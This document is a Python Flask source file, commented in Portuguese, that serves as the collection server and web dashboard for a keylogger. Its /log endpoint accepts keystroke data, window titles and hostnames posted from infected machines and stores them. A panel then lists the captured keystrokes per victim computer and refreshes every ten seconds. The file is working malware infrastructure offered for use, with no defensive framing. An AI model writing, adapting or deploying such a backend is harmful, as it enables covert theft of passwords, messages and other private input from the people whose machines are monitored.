from flask import Flask, request, jsonify, render_template_string
import sqlite3, os, datetime

app = Flask(__name__)
DB = "logs.db"

def get_db():
    conn = sqlite3.connect(DB)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                hostname TEXT NOT NULL,
                window TEXT,
                data TEXT NOT NULL,
                ts DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()

init_db()

# --- recebe log do keylogger ---
@app.route("/log", methods=["POST"])
def receive_log():
    j = request.get_json(force=True, silent=True)
    if not j:
        return jsonify({"error": "bad request"}), 400
    hostname = j.get("hostname", "unknown")
    window   = j.get("window", "")
    data     = j.get("data", "")
    if not data:
        return jsonify({"ok": True})
    with get_db() as conn:
        conn.execute("INSERT INTO logs (hostname, window, data) VALUES (?,?,?)",
                     (hostname, window, data))
        conn.commit()
    return jsonify({"ok": True})

# --- painel web ---
PANEL = """
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Painel</title>
<meta http-equiv="refresh" content="10">
<style>
  body { font-family: monospace; background:#0e0e0e; color:#d4d4d4; padding:20px; }
  h1 { color:#4ec9b0; }
  .pc { background:#1e1e1e; border:1px solid #333; border-radius:6px; padding:14px; margin-bottom:20px; }
  .pc h2 { color:#ce9178; margin:0 0 10px; }
  .entry { font-size:12px; color:#9cdcfe; margin:2px 0; }
  .window { color:#569cd6; font-weight:bold; margin-top:8px; }
  .ts { color:#555; }
</style>
</head>
<body>
<h1>🖥 Painel de Logs</h1>
<p style="color:#555">atualiza a cada 10s — {{ now }}</p>
{% for pc in pcs %}
<div class="pc">
  <h2>{{ pc }}</h2>
  {% for row in logs[pc] %}
    {% if row['window'] %}
      <div class="window">[ {{ row['window'] }} ]</div>
    {% endif %}
    <div class="entry"><span class="ts">{{ row['ts'] }}</span> &nbsp; {{ row['data'] }}</div>
  {% endfor %}
</div>
{% endfor %}
{% if not pcs %}<p>nenhum dado ainda.</p>{% endif %}
</body>
</html>
"""

@app.route("/")
def panel():
    with get_db() as conn:
        pcs = [r[0] for r in conn.execute(
            "SELECT DISTINCT hostname FROM logs ORDER BY hostname").fetchall()]
        logs = {}
        for pc in pcs:
            rows = conn.execute(
                "SELECT window, data, ts FROM logs WHERE hostname=? ORDER BY id DESC LIMIT 200",
                (pc,)).fetchall()
            logs[pc] = [dict(r) for r in rows]
    now = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    return render_template_string(PANEL, pcs=pcs, logs=logs, now=now)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
